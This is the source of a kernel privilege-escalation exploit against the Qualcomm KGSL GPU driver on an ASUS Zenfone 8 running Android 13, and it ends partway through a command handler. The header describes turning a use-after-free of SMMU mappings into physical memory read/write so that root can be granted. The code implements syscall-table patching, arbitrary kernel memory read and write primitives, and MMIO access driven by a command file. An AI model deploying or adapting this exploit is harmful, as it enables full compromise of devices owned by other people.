/* KGSL exploit: dangling SMMU mapping -> 3 GB physical read/write window,
 * patch __arm64_sys_pkey_alloc into a stub that grants root, then load a module.
 * 
 * Target: ASUS Zenfone 8 (I004D, Adreno A660, SM8350, kernel 5.4.210-qgki-perf,
 * Android 13). Two driver conditions have to hold together: kgsl_mmu_unmap()
 * ignores the -ENODEV that iommu_unmap() returns when it cannot unmap the full
 * range, and the free op for a GPUOBJ_ALLOC object with priv = 0 --
 * kgsl_free_pool_pages() -- has no MAPPED check. The entry is then freed with
 * its SMMU PTEs still mapped, so the GPU can still reach physical pages that
 * have already gone back to the pool.
 *
 * A hole in the page range is needed first, and plain anon and ION mappings
 * cannot produce one from a single thread: the SVM size check accepts a size
 * that wraps. The freed frames go back to the KGSL pool; the drain and the
 * UNMOVABLE pressure push them out to the buddy allocator, where slab growth for
 * the spray's kgsl_mem_entry objects claims them.
 * 
 * argv[1] is the UAF size in MB and must be 256; argv[2] is accepted and
 * ignored; argv[4] selects the mode: root, phaseb, selftest, raceonly,
 * oobprobe, slidetest, physrw, p2diag, p2only, bigmmap. */
#define _GNU_SOURCE
#ifndef V7_ENABLE_TRIGGER
#define V7_ENABLE_TRIGGER 0
#endif
 /* Final-stage guard, not a build policy: it covers the SELinux and credential
  * writes, so a build without it can trigger and can read physical memory but
  * cannot change anything. It sits after the physical mapping has succeeded, so
  * such a build prints one line, unmaps, and continues to the next attempt.
  * Once the attempts are exhausted control falls through to the park at the end
  * of main, whose only exit is the release compile flag: a build without the
  * guard is indistinguishable from one whose chain has stalled, which is what
  * the build script's string assertion exists to catch. */
#ifndef V7_ENABLE_PRIV_WRITE
#define V7_ENABLE_PRIV_WRITE 0
#endif
#include <poll.h>
#include <stdio.h>
#include <stdint.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/file.h>
#include <pthread.h>
#include <stdlib.h>
#include <signal.h>
#include <setjmp.h>
#include <sched.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include <stdarg.h>
#include <sys/stat.h>

/* Writes every line to stdout and to a file under /data/local/tmp, so a run
 * survives the shell that launched it. */
static FILE *logf;
/* Every line is pid-prefixed so interleaved runs can be told apart. */
static void L(const char *fmt, ...)
{
    va_list ap;
    printf("[%d] ", getpid());
    va_start(ap, fmt);
    vprintf(fmt, ap);
    fflush(stdout);
    va_end(ap);
    if (logf) {
        fprintf(logf, "[%d] ", getpid());
        va_start(ap, fmt);
        vfprintf(logf, fmt, ap);
        fflush(logf);
        /* No fsync per line: an fsync on this f2fs can wedge. log_fsync() flushes at
         * phase boundaries instead. */
        va_end(ap);
    }
}

/* Syncing to f2fs under spray pressure can wedge indefinitely; removing this
 * PoC's own sync() calls took survival from 26 s / 181 s to over 700 s. Every
 * sync path therefore goes through safe_sync(), which is a no-op once
 * g_no_pressure_sync is armed. The flag is global rather than stage-scoped
 * because the pressure spans the whole spray: log_fsync() has many call sites
 * and a stage-scoped flag would leave the rest still doing real fsync.
 * fflush() stays, so the host sees every line live; only durability across a
 * panic is lost, and that is the guarantee that has to go. */
static volatile int g_no_pressure_sync = 0;
/* The release path runs after the spray, when the pressure that makes fsync
 * wedge is gone. Durability matters there: the heal and free lists are the only
 * record of what the release touched, and a reset loses them. */
/* The release path can run in a process that shares this address space with main
 * (CLONE_VM), so a plain flag would turn fsync back on for main as well, which is
 * exactly the guarantee g_no_pressure_sync exists to keep. Scope it by pid. */
static volatile pid_t g_rel_durable_pid = 0;
static int rel_durable(void) { return g_rel_durable_pid == getpid(); }
static int env_on(const char *k);   /* defined with the other env helpers; used by the release gates */
static void safe_sync(void)
{
    if (g_no_pressure_sync && !rel_durable()) return;
    sync();
}
/* fsync on other file descriptors wedges the same way. */
static void safe_fsync(int fd)
{
    if (g_no_pressure_sync && !rel_durable()) return;
    /* Never call safe_fsync() from here. A self-call overflowed the stack, and the
     * children run SIGSEGV and SIGBUS as SIG_DFL, so the handler could not run
     * either and the whole chain vanished with no trace. */
    fsync(fd);
}
/* fsync the log at phase boundaries only (~20 per run): a crash loses nothing
 * newer than the last boundary. */
static void log_fsync(void)
{
    if (g_no_pressure_sync && !rel_durable()) return;
    if (logf) {
        fflush(logf);
        fsync(fileno(logf));
    }
}

/* Family test. The children rename themselves, so a comm prefix misses most of
 * them; exe still matches across fork, rename and deletion. comm is consulted only
 * when the exe link cannot be read at all. One left behind holds the kgsl fd open,
 * so kgsl_release never runs and the SMMU domain teardown never happens. */
static int pid_is_family(int pid, const char *self_exe)
{
    char lp[64], tgt[256];
    snprintf(lp, sizeof lp, "/proc/%d/exe", pid);
    ssize_t n = readlink(lp, tgt, sizeof tgt - 1);
    if (n > 0) {
        tgt[n] = 0;
        if (self_exe[0]) return !strcmp(tgt, self_exe);   /* exact: a second copy is not us */
        if (strstr(tgt, "kgsl_23373_poc")) return 1;
        return 0;
    }
    char cp[64], cm[32];
    snprintf(cp, sizeof cp, "/proc/%d/comm", pid);
    int cf = open(cp, O_RDONLY);
    if (cf < 0) return 0;
    ssize_t r = read(cf, cm, sizeof cm - 1);
    close(cf);
    if (r <= 0) return 0;
    cm[r] = 0;
    return !strncmp(cm, "kgsl_23373_poc_", 15) ||
           !strncmp(cm, "burn", 4) ||
           !strncmp(cm, "Z33107X", 7);
}

static void uaf_pause(void);
static volatile uint32_t *g_pkey_stub;
static uint32_t g_pkey_stub_backup[8];
static int restore_pkey_stub_now(void);
static int g_pkey_payload_nwords;
static inline void cache_maint_el0(volatile void *p, int bytes);
static void l1i_capacity_evict(void);
static void hb_halt(void);
static int kgsl_fd;                             /* declared before the keepalive fork closes it */
static volatile pid_t g_srv_pid;              /* pid of the forked server; 0 = none */
static volatile int   g_srv_alive_last = -1;  /* last liveness observation; -1 = none yet */
/* Sampled by the watchdog heartbeat, on its own thread. Progress printed from
 * the main thread can be dropped by f2fs writeback even though the syscall has
 * already returned, so the GO signal has to ride along with a print the
 * watchdog is making anyway -- adding more print lines only adds more writes
 * to lose. */
static volatile long   g_pkey_ret = -1;   /* return of the hijacked syscall; -1 = not yet called */
static volatile int    g_uid_after_pkey = -1;   /* getuid() after the call; -1 = not yet read */
/* KASLR slide, filled in by main once the chain has derived it.
 * PA = (VA - g_delta) - 0xffffffc010000000 + 0xa0000000
 * Declared this early because the uaf_pause() poller needs it. */
static uint64_t g_delta = 0;
static volatile uint8_t *g_lb;
static uint64_t g_M;
static int hx32(char *b, uint32_t v)
{
    int n = 0;
    for (int sh = 28; sh >= 0; sh -= 4) {
        int d = (int)((v >> sh) & 0xf);
        b[n++] = (char)(d < 10 ? '0' + d : 'a' + d - 10);
    }
    return n;
}
static int hx8(char *b, uint8_t v)
{
    static const char D[16] = "0123456789abcdef";
    b[0] = D[(v >> 4) & 0xF];
    b[1] = D[v & 0xF];
    return 2;
}
static void hang_handler(int sig)
{
    { static const char HH[] = "[hang_handler SIGALRM]\n"; syscall(SYS_write, 1, HH, sizeof(HH) - 1); }
    L("[!] watchdog fired; ioctl stuck; pausing to preserve the device\n");
    uaf_pause();
}
#define WD_START(s) do { alarm((s)); } while (0)
#define WD_STOP() do { alarm(0); } while (0)

/* After the UAF, exiting or being killed tears the SVM down over pages that
 * are already freed, which has hung or hard-reset the phone. Every post-UAF
 * exit path parks here instead and waits for the host to restart the attempt. */
static void uaf_pause(void)
{
    { static const char UP[] = "[uaf-pause-enter]\n"; syscall(SYS_write, 1, UP, sizeof(UP) - 1); }
    /* Grep anchor for the host harness: do not rename the string. A line emitted
     * from the main thread can be swallowed by f2fs writeback, so seeing it proves
     * nothing -- judge a run by the heartbeat instead. */
    L("[*] UAF live; pausing to preserve the device (no exit, avoids the kgsl teardown crash)\n");
    fflush(stdout);
    if (logf) fflush(logf);
    /* The loop also takes commands. RELEASE_MAIN is the controlled exit: once the
     * heal and free steps are done, the last holder leaves through the normal
     * teardown instead of dying inside it. */
    for (;;) {
        {
            static long long pz_cur = -1;
            int wfd = open("/data/local/tmp/wdcmd", O_RDONLY);
            if (wfd >= 0) {
                char pb[128];
                /* wdcmd is an ordinary file under /data/local/tmp and persists across
                 * restarts, so reading from offset 0 would replay the previous run's commands;
                 * seek to EOF on first open. This reader has no ':' framing and a 127-byte
                 * buffer, so an over-long command gets split and its tail is parsed again as a
                 * fresh command. */
                off_t pz_end = lseek(wfd, 0, SEEK_END);
                if (pz_cur < 0) pz_cur = (pz_end >= 0) ? (long long)pz_end : 0;
                else if (pz_end >= 0 && pz_end < pz_cur) pz_cur = 0;
                lseek(wfd, pz_cur, SEEK_SET);
                ssize_t rr = read(wfd, pb, sizeof(pb) - 1);
                close(wfd);
                if (rr > 0) {
                    if (pz_cur < 0) pz_cur = 0;
                    pz_cur += rr;
                    pb[rr] = 0;
                    if (strstr(pb, "RESTORE_STUB")) {
                        /* Restore the patched syscall stub. This has to be done by the paused main:
                         * under PKEY_HIJACK_ONLY the server is forked VM_DONTCOPY and has no window of its own,
                         * so restoring it there faults on MAP_FAILED; and a server that restores on
                         * its own never sets rel_stub_done, leaving the restore wait to time out. */
                        restore_pkey_stub_now();
                        /* The marker only proves this branch ran: the restore wait checks it with
                         * access(F_OK) and never reads it, so it says nothing about whether the stub
                         * is back. Judge that by the readback printed above. */
                        { int mf = open("/data/local/tmp/rel_stub_done", O_WRONLY | O_CREAT | O_TRUNC, 0666);
                          if (mf >= 0) { ssize_t wr = write(mf, "1\n", 2); (void)wr; close(mf); } }
                        log_fsync();
                    }
                    if (strstr(pb, "STOP_HB")) {
                        /* hb_halt() must run in the address space that owns the heartbeat thread,
                         * which this poller is. Idempotent; if the heartbeat was never started it
                         * only prints. */
                        static const char SH[] = "[PAUSE] STOP_HB\n";
                        syscall(SYS_write, 1, SH, sizeof(SH) - 1);
                        hb_halt();
                    }
                    if (strstr(pb, "RELEASE_MAIN")) {
                        /* No ':' framing here, so a buffer holding several commands exits on the first
                         * match and drops the rest without reporting it. Append one at a time and let
                         * the loop's 2 s pass consume each before sending the next. */
                        static const char ZB[] = "[PAUSE] RELEASE_MAIN; controlled exit\n";
                        syscall(SYS_write, 1, ZB, sizeof(ZB) - 1);
                        log_fsync();
                        syscall(SYS_exit_group, 0);
                    }
                    if (strstr(pb, "KRINSTALL")) {
                        /* RELEASE_KRINSTALL <sys_call_table_va> <nr> <target_va>: overwrite the entry
                         * for syscall nr with four instructions --
                         *   ldr x1,[x0,#8]; ldr x2,[x0,#16]; ldr x0,[x0]; b <target>
                         * so syscall(nr,a0,a1,a2) becomes target(a0,a1,a2) in every process. The write
                         * has to go through kernel code: the page table that describes the 3 GB window
                         * lives outside it. */
                        char *q = strstr(pb, "KRINSTALL") + 9;
                        uint64_t tbl = strtoull(q, &q, 16);
                        int nr = (int)strtoul(q, &q, 10);
                        uint64_t tgt = strtoull(q, &q, 16);
                        uint64_t ent_pa = (tbl + (uint64_t)nr * 8 - g_delta)
                                          - 0xffffffc010000000ULL + 0xa0000000ULL;
                        uint64_t stub = 0;
                        char ob[256]; int on = 0;
                        const char *pre = "[KRINSTALL] nr=";
                        while (*pre) ob[on++] = *pre++;
                        { char t[8]; int tn = 0; int v = nr;
                          if (v == 0) t[tn++] = '0';
                          while (v > 0) { t[tn++] = (char)('0' + v % 10); v /= 10; }
                          while (tn > 0) ob[on++] = t[--tn]; }
                        pre = " ent_pa=";
                        while (*pre) ob[on++] = *pre++;
                        on += hx32(ob + on, (uint32_t)(ent_pa >> 32));
                        on += hx32(ob + on, (uint32_t)ent_pa);
                        if (g_lb && g_delta &&
                            ent_pa >= 0x80000000ULL && ent_pa + 8 <= 0x80000000ULL + 0xC0000000ULL) {
                            volatile uint32_t *ep = (volatile uint32_t *)(void *)(g_lb + (ent_pa - 0x80000000ULL));
                            stub = (uint64_t)ep[0] | ((uint64_t)ep[1] << 32);
                        }
                        pre = " stub=";
                        while (*pre) ob[on++] = *pre++;
                        on += hx32(ob + on, (uint32_t)(stub >> 32));
                        on += hx32(ob + on, (uint32_t)stub);
                        if (stub && tgt) {
                            uint64_t st_pa = (stub - g_delta) - 0xffffffc010000000ULL + 0xa0000000ULL;
                            int64_t d = (int64_t)tgt - (int64_t)(stub + 12);
                            if (st_pa >= 0x80000000ULL && st_pa + 16 <= 0x80000000ULL + 0xC0000000ULL &&
                                d >= -134217728LL && d <= 134217724LL) {
                                uint32_t w[4];
                                w[0] = 0xF9400401u;   /* ldr x1, [x0, #8]  */
                                w[1] = 0xF9400802u;   /* ldr x2, [x0, #16] */
                                w[2] = 0xF9400000u;   /* ldr x0, [x0]      */
                                w[3] = 0x14000000u | ((uint32_t)((d >> 2) & 0x3FFFFFF));  /* b <target>: imm26 scaled by 4, so the reach is 2^27 */
                                volatile uint32_t *sp = (volatile uint32_t *)(void *)(g_lb + (st_pa - 0x80000000ULL));
                                pre = " before=";
                                while (*pre) ob[on++] = *pre++;
                                for (int i2 = 0; i2 < 4; i2++) { on += hx32(ob + on, sp[i2]); ob[on++] = ' '; }
                                for (int i2 = 0; i2 < 4; i2++) sp[i2] = w[i2];
                                cache_maint_el0((void *)sp, 16);
                                l1i_capacity_evict();
                                pre = " after=";
                                while (*pre) ob[on++] = *pre++;
                                for (int i2 = 0; i2 < 4; i2++) { on += hx32(ob + on, sp[i2]); ob[on++] = ' '; }
                                pre = (sp[3] == w[3]) ? "(landed)\n" : "(FAIL)\n";
                                while (*pre) ob[on++] = *pre++;
                            } else {
                                pre = " (rejected: out of range)\n";
                                /* All three range checks share this one message, so the log cannot say which
                                 * failed: the window bound on ent_pa, the window bound on the stub, and
                                 * |tgt-(stub+12)| <= 2^27, which is imm26*4. The distance gate is also the only
                                 * thing keeping target inside kernel text -- target_va has no guard of its own. */
                                while (*pre) ob[on++] = *pre++;
                            }
                        } else {
                            pre = " (no stub)\n";
                            while (*pre) ob[on++] = *pre++;
                        }
                        syscall(SYS_write, 1, ob, on);
                        log_fsync();
                    }
                    if (strstr(pb, "KREAD")) {
                        /* KREAD <nr> <va_hex> <n_bytes>: read kernel memory through the stub, which
                         * RELEASE_KRINSTALL must first have pointed at __arch_copy_to_user. */
                        char *q = strstr(pb, "KREAD") + 5;
                        int nr = (int)strtoul(q, &q, 10);
                        while (*q == ' ') q++;
                        uint64_t va = strtoull(q, &q, 16);
                        while (*q == ' ') q++;
                        int n = atoi(q);
                        if (n < 1) n = 64;
                        if (n > 65536) n = 65536;
                        static uint8_t kbuf[65536];
                        for (int i2 = 0; i2 < n; i2++) kbuf[i2] = 0xCC;
                        /* Filled with 0xCC first, so bytes the read did not cover show up as cc. */
                        /* __arch_copy_to_user does not fault on the source, so a bad VA page-faults in
                         * kernel context. Only accept kernel addresses (arm64 VA_BITS=39). */
                        long r;
                        if ((va >> 40) != 0xffffffULL) {
                            const char *e2 = "[KREAD] rejected: va is not a kernel address\n";
                            syscall(SYS_write, 1, e2, 52);
                            r = -22;
                        } else {
                            r = syscall(nr, kbuf, va, (size_t)n);
                        }
                        char ob[4096]; int on = 0;
                        const char *pre = "[KREAD] va=";
                        while (*pre) ob[on++] = *pre++;
                        on += hx32(ob + on, (uint32_t)(va >> 32));
                        on += hx32(ob + on, (uint32_t)va);
                        pre = " n=";
                        while (*pre) ob[on++] = *pre++;
                        { char t[12]; int tn = 0; int v = n;
                          while (v > 0) { t[tn++] = (char)('0' + v % 10); v /= 10; }
                          while (tn > 0) ob[on++] = t[--tn]; }
                        pre = " ret=";
                        while (*pre) ob[on++] = *pre++;
                        { long v = r; int neg = (v < 0); if (neg) v = -v;
                          char t[24]; int tn = 0;
                          if (v == 0) t[tn++] = '0';
                          while (v > 0) { t[tn++] = (char)('0' + v % 10); v /= 10; }
                          if (neg) t[tn++] = '-';
                          while (tn > 0) ob[on++] = t[--tn]; }
                        ob[on++] = '\n';
                        syscall(SYS_write, 1, ob, on);
                        for (int i2 = 0; i2 < n; i2 += 16) {
                            on = 0;
                            on += hx32(ob + on, (uint32_t)((va + (uint64_t)i2) >> 32));
                            on += hx32(ob + on, (uint32_t)(va + (uint64_t)i2));
                            ob[on++] = ':';
                            for (int j2 = 0; j2 < 16 && i2 + j2 < n; j2++) {
                                ob[on++] = ' ';
                                on += hx8(ob + on, kbuf[i2 + j2]);
                            }
                            ob[on++] = ' ';
                            ob[on++] = '|';
                            for (int j2 = 0; j2 < 16 && i2 + j2 < n; j2++) {
                                uint8_t c = kbuf[i2 + j2];
                                ob[on++] = (char)((c >= 32 && c < 127) ? c : '.');
                            }
                            ob[on++] = '|';
                            ob[on++] = '\n';
                            syscall(SYS_write, 1, ob, on);
                        }
                        log_fsync();
                    }
                    if (strstr(pb, "KWRITE")) {
                        /* KWRITE <nr> <va_hex> <hex_words...>: write kernel memory through the stub,
                         * which must first have been pointed at __arch_copy_from_user. */
                        char *q = strstr(pb, "KWRITE") + 6;
                        int nr = (int)strtoul(q, &q, 10);
                        while (*q == ' ') q++;
                        uint64_t va = strtoull(q, &q, 16);
                        static uint8_t kbuf[4096];
                        int nb = 0;
                        while (nb + 4 <= (int)sizeof(kbuf)) {
                            while (*q == ' ' || *q == '\t') q++;
                            if (*q == 0 || *q == '\n' || *q == '\r') break;
                            uint32_t wv = (uint32_t)strtoull(q, &q, 16);
                            kbuf[nb++] = (uint8_t)(wv & 0xFF);
                            kbuf[nb++] = (uint8_t)((wv >> 8) & 0xFF);
                            kbuf[nb++] = (uint8_t)((wv >> 16) & 0xFF);
                            kbuf[nb++] = (uint8_t)((wv >> 24) & 0xFF);
                        }
                        /* copy_from_user(to, from, n) takes the kernel address first, the reverse of
                         * KREAD's copy_to_user(user_buf, kernel_va, n). */
                        long r;
                        if (nb <= 0) r = -1;
                        else if ((va >> 40) != 0xffffffULL) {
                            const char *e2 = "[KWRITE] rejected: va is not a kernel address\n";
                            syscall(SYS_write, 1, e2, 53);
                            r = -22;
                        } else r = syscall(nr, va, kbuf, (size_t)nb);
                        char ob[256]; int on = 0;
                        const char *pre = "[KWRITE] va=";
                        while (*pre) ob[on++] = *pre++;
                        on += hx32(ob + on, (uint32_t)(va >> 32));
                        on += hx32(ob + on, (uint32_t)va);
                        pre = " nbytes=";
                        while (*pre) ob[on++] = *pre++;
                        { int v = nb; char t[12]; int tn = 0;
                          if (v == 0) t[tn++] = '0';
                          while (v > 0) { t[tn++] = (char)('0' + v % 10); v /= 10; }
                          while (tn > 0) ob[on++] = t[--tn]; }
                        pre = " ret=";
                        while (*pre) ob[on++] = *pre++;
                        { long v = r; int neg = (v < 0); if (neg) v = -v;
                          char t[24]; int tn = 0;
                          if (v == 0) t[tn++] = '0';
                          while (v > 0) { t[tn++] = (char)('0' + v % 10); v /= 10; }
                          if (neg) t[tn++] = '-';
                          while (tn > 0) ob[on++] = t[--tn]; }
                        ob[on++] = '\n';
                        syscall(SYS_write, 1, ob, on);
                        log_fsync();
                    }
                    if (strstr(pb, "MMIOR")) {
                        /* MMIOR <nr> <va_hex>: with the stub pointed at ioread32, syscall(nr, va) reads
                         * a 32-bit MMIO word. This is the only way to reach the RPMh RSC registers
                         * below 0x80000000, outside the window. Note the match is a strstr, so
                         * "MMIOR2 ..." also lands here and parses from the "2 ..." -- MMIOR2 then runs
                         * as well. */
                        char *q = strstr(pb, "MMIOR") + 5;
                        int nr = (int)strtoul(q, &q, 10);
                        while (*q == ' ') q++;
                        uint64_t va = strtoull(q, &q, 16);
                        long r = syscall(nr, (void *)va);
                        char ob[128]; int on = 0;
                        const char *pre = "[MMIOR] va=";
                        while (*pre) ob[on++] = *pre++;
                        on += hx32(ob + on, (uint32_t)(va >> 32));
                        on += hx32(ob + on, (uint32_t)va);
                        pre = " val=";
                        while (*pre) ob[on++] = *pre++;
                        on += hx32(ob + on, (uint32_t)((unsigned long)r & 0xFFFFFFFFUL));
                        pre = "\n";
                        while (*pre) ob[on++] = *pre++;
                        syscall(SYS_write, 1, ob, on);
                        log_fsync();
                    }
                    if (strstr(pb, "MMIOW")) {
                        /* MMIOW <nr> <va_hex> <val_hex>: with the stub pointed at iowrite32 the value
                         * comes first, so syscall(nr, val, va). */
                        char *q = strstr(pb, "MMIOW") + 5;
                        int nr = (int)strtoul(q, &q, 10);
                        while (*q == ' ') q++;
                        uint64_t va = strtoull(q, &q, 16);
                        while (*q == ' ') q++;
                        uint32_t val = (uint32_t)strtoul(q, &q, 16);
                        syscall(nr, (unsigned long)val, (void *)va);
                        char ob[128]; int on = 0;
                        const char *pre = "[MMIOW] va=";
                        while (*pre) ob[on++] = *pre++;
                        on += hx32(ob + on, (uint32_t)(va >> 32));
                        on += hx32(ob + on, (uint32_t)va);
                        pre = " val=";
                        while (*pre) ob[on++] = *pre++;
                        on += hx32(ob + on, val);
                        pre = "\n";
                        while (*pre) ob[on++] = *pre++;
                        syscall(SYS_write, 1, ob, on);
                        log_fsync();
                    }
                    if (strstr(pb, "KRFWD")) {
                        /* KRFWD <nr> <a0_hex> <a1_hex> <n>: call target(a0, a1, n) straight through the
                         * stub. Meant for __memcpy_fromio / __memcpy_toio: MMIO is Device memory and
                         * faults on the normal and vector accesses copy_to_user performs, so it has to
                         * go through the io accessors. Buffers are kernel addresses; read the result
                         * back with KREAD. */
                        char *q = strstr(pb, "KRFWD") + 5;
                        int nr = (int)strtoul(q, &q, 10);
                        while (*q == ' ') q++;
                        uint64_t a0 = strtoull(q, &q, 16);
                        while (*q == ' ') q++;
                        uint64_t a1 = strtoull(q, &q, 16);
                        while (*q == ' ') q++;
                        int n = atoi(q);
                        if (n < 1) n = 4;
                        long r = syscall(nr, (void *)a0, (void *)a1, (size_t)n);
                        char ob[192]; int on = 0;
                        const char *pre = "[KRFWD] nr=";
                        while (*pre) ob[on++] = *pre++;
                        { int v = nr; char t[8]; int tn = 0;
                          if (v == 0) t[tn++] = '0';
                          while (v > 0) { t[tn++] = (char)('0' + v % 10); v /= 10; }
                          while (tn > 0) ob[on++] = t[--tn]; }
                        pre = " a0=";
                        while (*pre) ob[on++] = *pre++;
                        on += hx32(ob + on, (uint32_t)(a0 >> 32));
                        on += hx32(ob + on, (uint32_t)a0);
                        pre = " a1=";
                        while (*pre) ob[on++] = *pre++;
                        on += hx32(ob + on, (uint32_t)(a1 >> 32));
                        on += hx32(ob + on, (uint32_t)a1);
                        pre = " n=";
                        while (*pre) ob[on++] = *pre++;
                        { int v = n; char t[8]; int tn = 0;
                          if (v == 0) t[tn++] = '0';
                          while (v > 0) { t[tn++] = (char)('0' + v % 10); v /= 10; }
                          while (tn > 0) ob[on++] = t[--tn]; }
                        pre = " ret=";
                        while (*pre) ob[on++] = *pre++;
                        { long v = r; int neg = (v < 0); if (neg) v = -v;
                          char t[24]; int tn = 0;
                          if (v == 0) t[tn++] = '0';
                          while (v > 0) { t[tn++] = (char)('0' + v % 10); v /= 10; }
                          if (neg) t[tn++] = '-';
                          while (tn > 0) ob[on++] = t[--tn]; }
                        pre = "\n";
                        while (*pre) ob[on++] = *pre++;
                        syscall(SYS_write, 1, ob, on);
                        log_fsync();
                    }
                    if (strstr(pb, "MMIOR2")) {
                        /* MMIOR2 <mem_nr> <io_nr> <scratch_kva> <ioremap_va> <n>: one MMIO read. The
                         * bytes land in a kernel buffer via __memcpy_fromio and are then copied to
                         * userspace, because MMIO cannot be copy_to_user'd directly. */
                        char *q = strstr(pb, "MMIOR2") + 6;
                        int mnr = (int)strtoul(q, &q, 10);
                        while (*q == ' ') q++;
                        int inr = (int)strtoul(q, &q, 10);
                        while (*q == ' ') q++;
                        uint64_t scr = strtoull(q, &q, 16);
                        while (*q == ' ') q++;
                        uint64_t iov = strtoull(q, &q, 16);
                        while (*q == ' ') q++;
                        int n = atoi(q);
                        if (n < 1 || n > 256) n = 4;
                        /* An out-of-range n is reset to 4 rather than clamped, and neither return value
                         * is checked, so a failed read shows up as 0xCC bytes. */
                        static uint8_t mbuf[256];
                        for (int i2 = 0; i2 < n; i2++) mbuf[i2] = 0xCC;
                        long r1 = syscall(inr, (void *)scr, (void *)iov, (size_t)n);
                        long r2 = syscall(mnr, mbuf, (void *)scr, (size_t)n);
                        char ob[512]; int on = 0;
                        const char *pre = "[MMIOR2] iova=";
                        while (*pre) ob[on++] = *pre++;
                        on += hx32(ob + on, (uint32_t)(iov >> 32));
                        on += hx32(ob + on, (uint32_t)iov);
                        pre = " r1=";
                        while (*pre) ob[on++] = *pre++;
                        { long v = r1; int neg = (v < 0); if (neg) v = -v; char t[24]; int tn = 0;
                          if (v == 0) t[tn++] = '0';
                          while (v > 0) { t[tn++] = (char)('0' + v % 10); v /= 10; }
                          if (neg) t[tn++] = '-';
                          while (tn > 0) ob[on++] = t[--tn]; }
                        pre = " r2=";
                        while (*pre) ob[on++] = *pre++;
                        { long v = r2; int neg = (v < 0); if (neg) v = -v; char t[24]; int tn = 0;
                          if (v == 0) t[tn++] = '0';
                          while (v > 0) { t[tn++] = (char)('0' + v % 10); v /= 10; }
                          if (neg) t[tn++] = '-';
                          while (tn > 0) ob[on++] = t[--tn]; }
                        pre = " val=";
                        while (*pre) ob[on++] = *pre++;
                        for (int i2 = 0; i2 < n; i2++) { on += hx8(ob + on, mbuf[i2]); }
                        pre = "\n";
                        while (*pre) ob[on++] = *pre++;
                        syscall(SYS_write, 1, ob, on);
                        log_fsync();
                    }
                    if (strstr(pb, "RSCDUMP")) {
                        /* RSCDUMP <tbl_va> <nr_mem> <nr_io> <ctu_va> <mfi_va> <rsc_drv_va>: install both
                         * stubs, read the driver's base and tcs_base, read the RSC TCS registers
                         * through __memcpy_fromio, then restore both stubs. It is one pass because the
                         * patched syscalls stay live throughout and any process calling them would run
                         * the wrong function. */
                        char *q = strstr(pb, "RSCDUMP") + 7;
                        uint64_t tbl = strtoull(q, &q, 16);
                        int nmem = (int)strtoul(q, &q, 10);
                        int nio  = (int)strtoul(q, &q, 10);
                        uint64_t ctu = strtoull(q, &q, 16);
                        uint64_t mfi = strtoull(q, &q, 16);
                        uint64_t rsc_drv_va = strtoull(q, &q, 16);
                        const uint64_t LO = 0x80000000ULL, HI = 0x80000000ULL + 0xC0000000ULL;
                        uint32_t saved[2][4]; int inst = 0;
                        uint64_t stubs[2]; int nrs[2] = { nmem, nio };
                        uint64_t tgts[2] = { ctu, mfi };
                        for (int k = 0; k < 2 && inst < 2; k++) {
                            uint64_t ent_pa = (tbl + (uint64_t)nrs[k] * 8 - g_delta)
                                              - 0xffffffc010000000ULL + 0xa0000000ULL;
                            uint64_t stub = 0;
                            if (g_lb && g_delta && ent_pa >= LO && ent_pa + 8 <= HI) {
                                volatile uint32_t *ep = (volatile uint32_t *)(void *)(g_lb + (ent_pa - LO));
                                stub = (uint64_t)ep[0] | ((uint64_t)ep[1] << 32);
                            }
                            if (!stub || !tgts[k]) continue;
                            uint64_t sp = (stub - g_delta) - 0xffffffc010000000ULL + 0xa0000000ULL;
                            int64_t d = (int64_t)tgts[k] - (int64_t)(stub + 12);
                            if (sp < LO || sp + 16 > HI || d < -134217728LL || d > 134217724LL) continue;
                            volatile uint32_t *sw = (volatile uint32_t *)(void *)(g_lb + (sp - LO));
                            for (int i = 0; i < 4; i++) saved[inst][i] = sw[i];
                            uint32_t w[4];
                            w[0] = 0xF9400401u; w[1] = 0xF9400802u; w[2] = 0xF9400000u;
                            w[3] = 0x14000000u | ((uint32_t)((d >> 2) & 0x3FFFFFF));
                            for (int i = 0; i < 4; i++) sw[i] = w[i];
                            cache_maint_el0((void *)sw, 16);
                            stubs[inst] = stub;
                            inst++;
                        }
                        l1i_capacity_evict();
                        char ob[4096]; int on = 0;
                        const char *pre = "[RSCDUMP] installed=";
                        while (*pre) ob[on++] = *pre++;
                        ob[on++] = (char)('0' + inst);
                        ob[on++] = '\n';
                        syscall(SYS_write, 1, ob, on);
                        uint64_t drv = 0;
                        {
                            uint64_t dp = (rsc_drv_va - g_delta) - 0xffffffc010000000ULL + 0xa0000000ULL;
                            if (g_lb && g_delta && dp >= LO && dp + 8 <= HI) {
                                volatile uint32_t *dpw = (volatile uint32_t *)(void *)(g_lb + (dp - LO));
                                drv = (uint64_t)dpw[0] | ((uint64_t)dpw[1] << 32);
                            }
                        }
                        static uint8_t mb[512];
                        uint64_t rsc_base = 0, tcs_base = 0;
                        if (inst == 2 && drv) {
                            for (int i = 0; i < 8; i++) mb[i] = 0;
                            syscall(nmem, mb, (void *)(drv + 8), (size_t)8);
                            for (int i = 0; i < 8; i++) rsc_base |= (uint64_t)mb[i] << (8 * i);
                            for (int i = 0; i < 8; i++) mb[i] = 0;
                            syscall(nmem, mb, (void *)(drv + 16), (size_t)8);
                            for (int i = 0; i < 8; i++) tcs_base |= (uint64_t)mb[i] << (8 * i);
                        }
                        on = 0;
                        pre = "[RSCDUMP] drv=";
                        while (*pre) ob[on++] = *pre++;
                        on += hx32(ob + on, (uint32_t)(drv >> 32)); on += hx32(ob + on, (uint32_t)drv);
                        pre = " base=";
                        while (*pre) ob[on++] = *pre++;
                        on += hx32(ob + on, (uint32_t)(rsc_base >> 32)); on += hx32(ob + on, (uint32_t)rsc_base);
                        pre = " tcs_base=";
                        while (*pre) ob[on++] = *pre++;
                        on += hx32(ob + on, (uint32_t)(tcs_base >> 32)); on += hx32(ob + on, (uint32_t)tcs_base);
                        ob[on++] = '\n';
                        syscall(SYS_write, 1, ob, on);
                        /* Only the TCS data registers are read. IRQ_ENABLE, IRQ_STATUS and IRQ_CLEAR
                         * are read-clear: reading them clears RPMh's completion interrupt and the
                         * driver then hangs. */
                        static const uint32_t REGS[5] = { 0x10, 0x14, 0x18, 0x1C, 0x30 };
                        if (inst == 2 && tcs_base) {
                            uint64_t scratch = drv + 0x120;   /* tcs[3].req[0], an unused CONTROL-group entry */
                            for (int m = 0; m < 8; m++) {
                                on = 0;
